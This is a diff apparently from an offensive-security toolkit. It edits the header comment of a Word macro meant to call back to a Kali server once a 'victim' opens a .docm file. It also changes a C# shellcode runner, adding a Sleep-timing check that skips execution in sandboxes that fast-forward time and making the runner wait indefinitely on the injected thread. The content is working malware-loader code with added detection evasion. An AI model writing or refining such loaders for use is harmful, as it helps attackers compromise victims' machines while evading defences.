@@ -227,7 +227,7 @@ if __name__ == "__main__":
 ' Purpose: Harmless callback macro. Confirms the macro actually ran after the
 '          victim opens the .docm, BEFORE any malicious payload is delivered.
 ' Scenario: M01 - Scenario 1 (website accepts .docm, macro triggers, bitness unknown)
-' Reference: cheat sheet "Microsoft Word -> Callback Pinging"
+' Reference: 速查笔记 "Microsoft Word -> Callback Pinging"
 ' Dependencies: No payload needed. HTTP server on the Kali side only
 '          (see m01-http-file-server.md).
 ' Usage:
@@ -1209,6 +1209,9 @@ class Runner
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
+    [DllImport("kernel32.dll")]
+    private static extern void Sleep(uint dwMilliseconds);
+
     private static byte[] Decode()
     {
         byte[] data = Convert.FromBase64String(SHELLCODE_B64);
@@ -1218,6 +1221,10 @@ class Runner
 
     public static void Run()
     {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;
+
         byte[] sc = Decode();
 
         const uint MEM_COMMIT_RESERVE = 0x3000;
@@ -1240,7 +1247,7 @@ class Runner
             return;
         }
 
-        WaitForSingleObject(h, 2000);
+        WaitForSingleObject(h, 0xFFFFFFFF);
     }
 
     public static void Main(string[] args)
